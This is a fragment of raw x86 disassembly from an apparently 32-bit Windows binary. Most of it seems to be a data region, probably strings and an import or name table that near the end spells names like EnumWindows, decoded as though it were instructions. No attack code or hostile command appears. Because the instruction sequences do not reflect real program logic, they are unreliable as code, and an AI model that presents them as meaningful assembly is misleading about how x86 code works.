  4236fe:	add    BYTE PTR ss:[ecx+0x0],bl
  423702:	dec    ebp
  423703:	add    BYTE PTR [esi],dh
  423705:	add    BYTE PTR [ebx],dh
  423707:	add    BYTE PTR [edi+0x0],bl
  42370a:	xor    al,0x0
  42370c:	dec    esi
  42370d:	add    BYTE PTR [edx],dh
  42370f:	add    BYTE PTR [esi],dh
  423711:	add    BYTE PTR [ecx],dh
  423713:	add    BYTE PTR [eax],al
  423715:	add    BYTE PTR [ebx+0x0],cl
  423718:	dec    eax
  423719:	add    BYTE PTR [eax],bh
  42371b:	add    BYTE PTR [edi+0x0],bl
  42371e:	inc    esi
  42371f:	add    BYTE PTR [esi+0x0],al
  423722:	push   esp
  423723:	add    BYTE PTR [edi],dh
  423725:	add    BYTE PTR [esi],dh
  423727:	add    BYTE PTR [edi+0x0],bl
  42372a:	dec    esp
  42372b:	add    BYTE PTR [ecx+0x0],bl
  42372e:	add    BYTE PTR [eax],al
  423730:	push   ebx
  423731:	add    BYTE PTR [ecx+0x0],bl
  423734:	xor    BYTE PTR [eax],al
  423736:	pop    edi
  423737:	add    BYTE PTR [ecx],bh
  423739:	add    BYTE PTR [edx+0x0],dl
  42373c:	dec    eax
  42373d:	add    BYTE PTR [ecx+0x0],bl
  423740:	xor    al,BYTE PTR [eax]
  423742:	pop    edi
  423743:	add    BYTE PTR [eax],dh
  423745:	add    BYTE PTR [eax],al
  423747:	add    BYTE PTR [edx+0x0],al
  42374a:	dec    edx
  42374b:	add    BYTE PTR [esi+0x0],cl
  42374e:	xor    al,BYTE PTR [eax]
  423750:	pop    edi
  423751:	add    BYTE PTR [eax+eax*1+0x33],cl
  423755:	add    BYTE PTR [edx+0x0],dl
  423758:	xor    al,0x0
  42375a:	dec    eax
  42375b:	add    BYTE PTR [eax],al
  42375d:	add    BYTE PTR [ebp+0x0],dl
  423760:	add    BYTE PTR ss:[ebp+0x0],cl
  423764:	xor    DWORD PTR [eax],eax
  423766:	pop    edi
  423767:	add    BYTE PTR [esi],dh
  423769:	add    BYTE PTR [ecx+0x0],bl
  42376c:	push   ebp
  42376d:	add    BYTE PTR [eax+eax*1+0x5f],dl
  423771:	add    BYTE PTR [edi+0x0],cl
  423774:	inc    esp
  423775:	add    BYTE PTR [edi+0x0],dl
  423778:	push   ebx
  423779:	add    BYTE PTR [eax],al
  42377b:	add    BYTE PTR [edx+0x0],bl
  42377e:	inc    ebx
  42377f:	add    BYTE PTR [ebp+0x0],dl
  423782:	pop    edi
  423783:	add    BYTE PTR [ecx],dh
  423785:	add    BYTE PTR [ebp+0x0],al
  423788:	push   esp
  423789:	add    BYTE PTR [eax],dh
  42378b:	add    BYTE PTR [eax],al
  42378d:	add    BYTE PTR [eax],al
  42378f:	add    BYTE PTR [eax],al
  423791:	add    BYTE PTR [eax-0x7ffbffbe],al
  423797:	inc    edx
  423798:	add    BYTE PTR [eax],cl
  42379a:	add    BYTE PTR [edx+0x0],0xc
  42379e:	add    BYTE PTR [edx+0x0],0x10
  4237a2:	add    BYTE PTR [edx+0x0],0x14
  4237a6:	add    BYTE PTR [edx+0x0],0x18
  4237aa:	add    BYTE PTR [edx+0x0],0x1c
  4237ae:	add    BYTE PTR [edx+0x0],0x20
  4237b2:	add    BYTE PTR [edx+0x0],0x24
  4237b6:	add    BYTE PTR [edx+0x0],0x28
  4237ba:	add    BYTE PTR [edx+0x0],0x0
  4237be:	add    BYTE PTR [eax],al
  4237c0:	add    BYTE PTR [eax],al
  4237c2:	add    BYTE PTR [eax],al
  4237c4:	xor    ebx,DWORD PTR [edi]
  4237c6:	ja     0x423815
  4237c8:	add    BYTE PTR [eax],al
  4237ca:	add    BYTE PTR [eax],al
  4237cc:	repnz aaa 
  4237ce:	add    al,BYTE PTR [eax]
  4237d0:	add    DWORD PTR [eax],eax
  4237d2:	add    BYTE PTR [eax],al
  4237d4:	add    DWORD PTR [eax],eax
  4237d6:	add    BYTE PTR [eax],al
  4237d8:	add    DWORD PTR [eax],eax
  4237da:	add    BYTE PTR [eax],al
  4237dc:	call   0xec423a18
  4237e1:	aaa    
  4237e2:	add    al,BYTE PTR [eax]
  4237e4:	lock aaa 
  4237e6:	add    al,BYTE PTR [eax]
  4237e8:	daa    
  4237e9:	mov    BYTE PTR [eax],al
  4237eb:	add    dh,bh
  4237ed:	aaa    
  4237ee:	add    al,BYTE PTR [eax]
  4237f0:	add    BYTE PTR [eax],al
  4237f2:	push   edi
  4237f3:	outs   dx,DWORD PTR ds:[esi]
  4237f4:	jb     0x42385a
  4237f6:	push   edi
  4237f7:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  4237fe:	aas    
  4237ff:	inc    ebp
  423800:	outs   dx,BYTE PTR ds:[esi]
  423801:	jne    0x423870
  423803:	push   edi
  423804:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  42380b:	popa   
  42380c:	je     0x423877
  42380e:	outs   dx,DWORD PTR ds:[esi]
  42380f:	outs   dx,BYTE PTR ds:[esi]
  423810:	jae    0x423865
  423812:	je     0x423875
  423814:	.byte 0x74
